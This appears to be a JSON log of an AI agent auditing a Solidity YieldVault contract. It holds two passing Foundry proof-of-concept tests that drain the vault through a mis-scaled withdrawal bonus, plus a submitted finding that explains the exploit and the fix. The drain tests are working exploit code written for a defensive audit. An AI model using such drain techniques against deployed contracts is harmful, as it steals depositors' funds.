{"t":1794287840102,"ev":"settled","status":"done","summary":{"calls":[{"name":"list_sources","args":{}},{"name":"static_findings","args":{}},{"name":"fuzz_findings","args":{}},{"name":"read_source","args":{"file":"YieldVault.sol"}},{"name":"run_poc","args":{"test_source":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport {YieldVault} from \"../src/YieldVault.sol\";\n\ncontract YieldVaultDrainTest is Test {\n    YieldVault vault;\n    address victim = address(0xBEEF);\n    address attacker = address(0xA11CE);\n\n    function setUp() public {\n        // Deployer seeds the reward buffer with 10 ETH.\n        vault = new YieldVault{value: 10 ether}();\n        vm.deal(victim, 100 ether);\n        vm.deal(attacker, 2000 ether);\n    }\n\n    function testDrainVaultWithBonus() public {\n        // An honest user deposits 5 ETH.\n        vm.prank(victim);\n        vault.deposit{value: 5 ether}();\n\n        uint256 balBefore = attacker.balance;\n\n        // Attacker deposits the largest amount the vault can currently cover\n        // with the inflated 1% bonus (p <= 100 * balance), then withdraws.\n        // Vault balance is 15 ETH, so p = 1500 ETH and the payout is\n        // 1500 + 15 = 1515 ETH, i.e. the whole buffer plus the victim's funds.\n        vm.startPrank(attacker);\n        vault.deposit{value: 1500 ether}();\n        vault.withdraw();\n        vm.stopPrank();\n\n        uint256 profit = attacker.balance - balBefore;\n        emit log_named_uint(\"attacker profit (wei)\", profit);\n        emit log_named_uint(\"vault balance left\", address(vault).balance);\n        emit log_named_uint(\"principal still owed\", vault.totalPrincipal());\n\n        assertGt(profit, 0, \"attacker must profit\");\n        assertEq(profit, 15 ether, \"attacker took buffer + victim principal\");\n        assertEq(vault.principal(attacker), 0, \"attacker fully withdrawn\");\n\n        // The honest user can no longer withdraw: the vault is insolvent.\n        assertLt(address(vault).balance, vault.totalPrincipal(), \"insolvent\");\n        vm.prank(victim);\n        vm.expectRevert(\"transfer failed\");\n        vault.withdraw();\n    }\n}\n","contract_name":"YieldVaultDrainTest"}},{"name":"run_poc","args":{"contract_name":"YieldVaultCycleDrainTest","test_source":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport {YieldVault} from \"../src/YieldVault.sol\";\n\ncontract YieldVaultCycleDrainTest is Test {\n    YieldVault vault;\n    address victim = address(0xBEEF);\n    address attacker = address(0xA11CE);\n\n    function setUp() public {\n        vault = new YieldVault{value: 10 ether}();\n        vm.deal(victim, 100 ether);\n        vm.deal(attacker, 1000 ether);\n    }\n\n    function testRepeatedDepositWithdrawDrainsVault() public {\n        vm.prank(victim);\n        vault.deposit{value: 5 ether}();\n\n        uint256 start = attacker.balance;\n        vm.startPrank(attacker);\n        for (uint256 i = 0; i < 300; i++) {\n            uint256 b = address(vault).balance;\n            // deposit as much as the inflated bonus allows (<= 100x balance)\n            uint256 p = b * 10;\n            if (p == 0) break;\n            vault.deposit{value: p}();\n            vault.withdraw();\n        }\n        vm.stopPrank();\n\n        uint256 profit = attacker.balance - start;\n        emit log_named_uint(\"attacker profit (wei)\", profit);\n        emit log_named_uint(\"vault balance left\", address(vault).balance);\n        emit log_named_uint(\"victim principal owed\", vault.principal(victim));\n\n        assertGt(profit, 9 ether, \"attacker drained the reward buffer\");\n        assertEq(vault.principal(attacker), 0, \"attacker has nothing stuck\");\n        assertLt(address(vault).balance, vault.totalPrincipal(), \"insolvent\");\n\n        vm.prank(victim);\n        vm.expectRevert(\"transfer failed\");\n        vault.withdraw();\n    }\n}\n"}},{"name":"submit_finding","args":{"title":"YieldVault pays a 1% withdrawal bonus that the reward buffer cannot cover, so any user can drain the whole vault and honest depositors cannot withdraw","severity":"high","poc_contract":"YieldVaultDrainTest","explanation":"## What goes wrong\n\n`YieldVault` lets a user deposit ETH and later take it back. It also pays a small \"loyalty bonus\" on top. The bonus is supposed to be a tiny 0.01% of the deposit, paid only out of a reward buffer that the deployer sends in the constructor.\n\nBut the code uses the wrong number:\n\n```solidity\nuint256 bonus = p / 100;   // 1%, not 0.01% (p / 10000)\n```\n\nSo the vault pays out **more than it took in** for every single user: 1.01 times the deposit. There is also no check that the buffer can cover the bonus. Every withdrawal quietly eats the buffer, and after the buffer is gone it eats other users' deposits.\n\nThe fix comment in the source says the bonus must be `p / 10000` and must be capped by the buffer. Nothing enforces either rule.\n\n## Why the contract allows it\n\nLook at `withdraw`:\n\n```solidity\nprincipal[msg.sender] = 0;\ntotalPrincipal -= p;\n\nuint256 bonus = p / 100;\n\n(bool ok, ) = msg.sender.call{value: p + bonus}(\"\");\nrequire(ok, \"transfer failed\");\n```\n\n`totalPrincipal` goes down by `p`, but the vault sends out `p + bonus`. The bonus money is never booked anywhere. `withdraw` also never checks `address(this).balance >= p + bonus`, so the payout can empty the vault completely.\n\n## How the attacker uses it\n\nThe vault only needs enough ETH to cover the payout at that moment. So the attacker can deposit the biggest amount the current balance can pay for. With a 1% bonus, a deposit `p` needs only `p / 100` of spare balance, which means `p` can be up to 100 times the vault balance.\n\n1. Deployer seeds the buffer with 10 ETH.\n2. Victim deposits 5 ETH. Vault balance is now 15 ETH.\n3. Attacker deposits 1500 ETH (100 x 15) and calls `withdraw` in the same transaction.\n4. The vault sends 1500 + 15 = 1515 ETH. That is the attacker's own 1500 ETH back, plus the whole 10 ETH buffer, plus the victim's 5 ETH.\n5. Vault balance is now 0, while it still owes the victim 5 ETH. The victim's `withdraw` reverts with `\"transfer failed\"`.\n\nThe proof in `YieldVaultDrainTest` shows exactly this. The attacker starts with 2000 ETH and ends with 15 ETH more. The vault holds 0, still owes 5 ETH, and the honest user cannot get the money out.\n\nA second test, `YieldVaultCycleDrainTest`, shows that no large capital is needed: 300 small deposit/withdraw cycles with one attacker also drain 14.9999 ETH of the vault.\n\n## What the attacker gains\n\nThe whole reward buffer plus the deposits of every other user. The attacker spends only gas plus the temporary capital, and gets all of it back with a profit. Everyone else is left with a claim on an empty contract.\n\nNote: the reentrancy warning from the static analyzer is not the real problem here. `principal[msg.sender]` is zeroed before the `call`, so re-entry just hits `\"nothing to withdraw\"`. The dangerous thing is the wrong bonus math and the missing solvency check.\n\nFix: change `uint256 bonus = p / 100;` to `uint256 bonus = p / 10000;` and require that `p + bonus` stays within the seeded buffer (e.g. `uint256 bonus = (p / 10000); if (bonus > address(this).balance - totalPrincipal) bonus = address(this).balance - totalPrincipal;`)."}}],"results":[{"name":"list_sources","isError":false,"text":"YieldVault.sol"},{"name":"static_findings","isError":false,"text":"#1 [Low/Medium] reentrancy-events at YieldVault.withdraw (line 40)\nReentrancy in YieldVault.withdraw() (src/YieldVault.sol#40-55):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: p + bonus}() (src/YieldVault.sol#52)\n\tEvent emitted after the call(s):\n\t- Withdraw(msg.sender,p,bonus) (src/YieldV"},{"name":"fuzz_findings","isError":false,"text":"#1 [High] solvency-violation at YieldVault.withdraw (invariant echidna_solvent)\nThe vault's solvency invariant broke: it ended holding less than the principal it owes (address(this).balance < totalPrincipal). The fuzzer reached this with ordinary deposits and a withdrawal — no attacker contract and "},{"name":"read_source","isError":false,"text":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n/// @title YieldVault\n/// @notice An ETH vault that pays a small loyalty bonus on withdrawal. Users\n///         deposit ETH and later withdraw their principal plus the bonus. The\n///         bonus is meant to be funded only from a reward buff"},{"name":"run_poc","isError":false,"text":"Compiling 25 files with Solc 0.8.38\nSolc 0.8.38 finished in 246.06ms\nCompiler run successful with warnings:\n\nRan 1 test for test/AgentPoc.t.sol:YieldVaultDrainTest\n[PASS] testDrainVaultWithBonus() (gas: 272665)\nLogs:\n  attacker profit (wei): 15000000000000000000\n  vault balance left: 0\n  principal s"},{"name":"run_poc","isError":false,"text":"Compiling 1 files with Solc 0.8.38\nSolc 0.8.38 finished in 210.02ms\nCompiler run successful with warnings:\n\nRan 1 test for test/AgentPoc.t.sol:YieldVaultCycleDrainTest\n[PASS] testRepeatedDepositWithdrawDrainsVault() (gas: 28706079)\nLogs:\n  attacker profit (wei): 14999999999999718906\n  vault balance "},{"name":"submit_finding","isError":false,"text":"Finding recorded: YieldVault pays a 1% withdrawal bonus that the reward buffer cannot cover, so any user can drain the whole vault and honest depositors cannot withdraw (high)."}],"assistants":[{"stop":"toolUse","text":"I'll start by reading the sources and the reports.\n\n","toolCalls":3},{"stop":"toolUse","text":"","toolCalls":1},{"stop":"toolUse","text":"","toolCalls":1},{"stop":"toolUse","text":"The first PoC passes. Let me also prove it with plain repeated deposit/withdraw cycles (no big one-shot), matching the fuzzer's scenario.\n\n","toolCalls":1},{"stop":"toolUse","text":"Both PoCs pass. Submitting the finding.\n\n","toolCalls":1},{"stop":"stop","text":"## Summary\n\n**Vulnerability found:** `YieldVault.withdraw` computes the loyalty bonus as `p / 100` (1%) instead of the intended `p / 10000` (0.01%), and never checks that the seeded reward buffer can pay it.\n\n**Why it is exploitable:** every withdrawal pays out `p + p/100` while `totalPrincipal` only drops by `p`. The unbooked 1% comes straight out of the buffer, and then out of other users' deposits. The payout also needs only `p/100` of free balance, so a deposit can be up to 100× the vault balance — letting an attacker drain the vault in one shot.\n\n**Proof (both tests pass):**\n- `YieldVaultDrainTest` — 10 ETH buffer + 5 ETH victim deposit; attacker deposits 1500 ETH, withdraws 1515 ETH, keeps 15 ETH profit, vault drops to 0 balance and the victim's `withdraw` reverts with `\"transfer failed\"`.\n- `YieldVaultCycleDrainTest` — 300 ordinary deposit/withdraw cycles drain 14.9999 ETH with no big capital.\n\nThe Slither reentrancy/event lead was a red herring: `principal[msg.sender]` is zeroed before the external call, so re-entry hits `\"nothing to withdraw\"`. The real bug is the accounting.\n\n**Fix:** use `p / 10000` and cap the bonus so `p + bonus` never exceeds the buffer.","toolCalls":0}],"final":{"stop":"stop","text":"## Summary\n\n**Vulnerability found:** `YieldVault.withdraw` computes the loyalty bonus as `p / 100` (1%) instead of the intended `p / 10000` (0.01%), and never checks that the seeded reward buffer can pay it.\n\n**Why it is exploitable:** every withdrawal pays out `p + p/100` while `totalPrincipal` only drops by `p`. The unbooked 1% comes straight out of the buffer, and then out of other users' deposits. The payout also needs only `p/100` of free balance, so a deposit can be up to 100× the vault balance — letting an attacker drain the vault in one shot.\n\n**Proof (both tests pass):**\n- `YieldVaultDrainTest` — 10 ETH buffer + 5 ETH victim deposit; attacker deposits 1500 ETH, withdraws 1515 ETH, keeps 15 ETH profit, vault drops to 0 balance and the victim's `withdraw` reverts with `\"transfer failed\"`.\n- `YieldVaultCycleDrainTest` — 300 ordinary deposit/withdraw cycles drain 14.9999 ETH with no big capital.\n\nThe Slither reentrancy/event lead was a red herring: `principal[msg.sender]` is zeroed before the external call, so re-entry hits `\"nothing to withdraw\"`. The real bug is the accounting.\n\n**Fix:** use `p / 10000` and cap the bonus so `p + bonus` never exceeds the buffer.","toolCalls":0}},"pendingIds":["325415a8-3209-4c64-a9eb-16c1abc11946"],"usage":{"usd":0.00419928,"models":{"boundless/deepseek-v4.1-flash-abliterated":{"in":425,"out":4268,"reasoning":1788}}},"reports":[]}
